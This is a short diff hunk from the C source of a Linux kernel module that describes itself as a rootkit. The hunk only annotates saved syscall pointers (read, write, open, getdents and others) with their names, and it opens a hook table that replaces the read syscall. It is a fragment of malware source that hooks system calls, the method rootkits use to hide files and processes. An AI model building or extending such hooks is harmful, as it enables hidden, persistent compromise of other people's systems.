@@ -19,18 +19,18 @@ MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
 MODULE_DESCRIPTION("A Linux kernel rootkit");
 MODULE_VERSION("0.1");
 
-static sysfun_t orig_read;       // 0
-static sysfun_t orig_write;      // 1
-static sysfun_t orig_open;       // 2
-static sysfun_t orig_pread64;    // 17
-static sysfun_t orig_sendfile;   // 40
-static sysfun_t orig_getdents;   // 78
-static sysfun_t orig_getdents64; // 217
-// static sysfun_t orig_pwrite64; // 18
-// static sysfun_t orig_readv;    // 19
-// static sysfun_t orig_writev;   // 20
-// static sysfun_t orig_preadv;   // 295
-// static sysfun_t orig_pwritev;  // 296
+static sysfun_t orig_read;       // sys_read: 0
+static sysfun_t orig_write;      // sys_write: 1
+static sysfun_t orig_open;       // sys_open: 2
+static sysfun_t orig_pread64;    // sys_pread64: 17
+static sysfun_t orig_sendfile;   // sys_sendfile: 40
+static sysfun_t orig_getdents;   // sys_getdents: 78
+static sysfun_t orig_getdents64; // sys_getdents64: 217
+// static sysfun_t orig_pwrite64; // sys_pwrite64: 18
+// static sysfun_t orig_readv;    // sys_readv: 19
+// static sysfun_t orig_writev;   // sys_writev: 20
+// static sysfun_t orig_preadv;   // sys_preadv: 295
+// static sysfun_t orig_pwritev;  // sys_pwritev: 296
 
 static hook_t p_syscall_hooks[] = {
     NEW_HOOK(__NR_read, new_read, orig_read),
